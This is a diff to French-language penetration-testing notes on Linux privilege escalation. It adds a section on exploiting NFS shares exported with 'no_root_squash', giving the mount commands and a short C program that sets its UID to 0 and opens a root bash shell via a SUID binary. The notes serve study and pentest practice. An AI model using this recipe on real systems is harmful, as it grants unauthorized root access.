@@ -579,8 +579,28 @@ Penser aux Capabilities : "getcap -r / 2>/dev/null"
 
 Lister les derniers fichiers créés, ouverts ou modifiés :
     ===> find / -mtime 5 -xdev > dump.txt
-Lister les fichiers avec des permissions SUID :
-    ===> find / -perm -4000
+
+Penser aussi à vérifier les partages NFS.
+Par défaut, NFS change l'utilisateur root en "nfsnobody" et empêche tous les fichiers de s'exécuter avec root.
+Mais si il y a l'option "no_root_squash" sur un partage, on peut créer un exécutable avec SUID et l'envoyer sur le système.
+
+    ===> cat /etc/exports 
+    ===> mkdir /tmp/dossier
+    ===> sudo mount -o rw 10.10.10.10:/backups /tmp/dossier
+    ===> gcc nfs.c -o nfs -w
+    ===> chmod +s nfs
+    ===> ./nfs
+
+nfs.c : 
+------------------------------
+int main()
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+------------------------------
 
 ### Retranscription de la checklist de g0tmi1k pour l'élévation de privilèges.
 ### Recopiée en dure au cas où le lien tombe.
